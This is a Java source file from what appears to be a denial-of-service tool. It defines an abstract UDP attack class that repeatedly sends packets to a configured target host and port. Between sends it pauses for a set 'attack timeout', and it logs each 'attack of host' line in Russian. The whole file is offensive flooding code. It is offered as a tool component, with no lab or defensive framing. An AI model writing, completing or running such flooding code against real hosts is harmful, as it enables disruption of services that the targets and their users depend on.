package ru.gavrilov.protocols.abstracts;

import ru.gavrilov.common.Controller;
import ru.gavrilov.controllers.DosFormController;
import ru.gavrilov.protocols.entry.DosEntry;

import java.net.DatagramPacket;
import java.net.DatagramSocket;
import java.net.InetSocketAddress;
import java.net.SocketException;

public abstract class UDP extends DOS {
    private DatagramSocket socket;
    private DatagramPacket packet;

    public UDP(DosEntry dosEntry, Controller controller) {
        super(dosEntry,controller);
    }

    @Override
    public void run() {
        createSocket();
        connectToSocket();
        while(!Thread.currentThread().isInterrupted() && !this.socket.isClosed() && !DosFormController.stopThread) {
            writeLineToSocket(getDosEntry().getMessage());
            getController().appendToLog("Атака хоста " + getDosEntry().getHost() + ":" + getDosEntry().getPort());
            try {
                Thread.sleep(getDosEntry().getTimeoutAttack());
            } catch (InterruptedException ex) {
                Thread.currentThread().interrupt();
                ex.printStackTrace();
            }
        }
        closeSocket();
    }

    protected void createSocket() {
        try {
            this.socket = new DatagramSocket(0);
            this.socket.setSoTimeout(getDosEntry().getSocketTimeout());
        } catch (SocketException ex) {
            getController().appendToLog("Ошибка при создании или доступе к сокету!");
            ex.printStackTrace();
        }
    }

    public abstract void writeLineToSocket(String message);

    protected void connectToSocket() {
        setAddress(new InetSocketAddress(getDosEntry().getHost(),getDosEntry().getPort()));
        this.packet = new DatagramPacket(new byte[1],1,getAddress());
    }

    protected void closeSocket() {
        if(this.socket != null && !this.socket.isClosed() && this.socket.isBound()) {
            this.socket.close();
        }
    }

    public DatagramSocket getSocket() {
        return socket;
    }

    public void setSocket(DatagramSocket socket) {
        this.socket = socket;
    }

    public DatagramPacket getPacket() {
        return packet;
    }

    public void setPacket(DatagramPacket packet) {
        this.packet = packet;
    }
}
